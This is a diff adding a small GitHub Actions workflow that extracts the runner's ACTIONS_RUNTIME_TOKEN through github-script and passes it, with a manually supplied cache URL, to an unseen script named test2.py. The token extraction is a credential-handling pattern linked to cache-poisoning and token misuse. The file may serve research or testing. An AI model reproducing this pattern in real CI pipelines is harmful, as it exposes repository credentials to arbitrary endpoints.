@@ -1,0 +1,23 @@
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+jobs:
+  download-cache:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/github-script@v6
+        id: script
+        timeout-minutes: 30
+        with:
+          debug: true
+          script: |
+            const token = process.env['ACTIONS_RUNTIME_TOKEN'];
+            core.setOutput('TOKEN', token.trim())
+      - run: |
+          python test2.py
+        env: 
+          ACTIONS_RUNTIME_TOKEN: ${{ steps.script.outputs.TOKEN }}
+          CACHE_URL: ${{ github.event.inputs.url }}
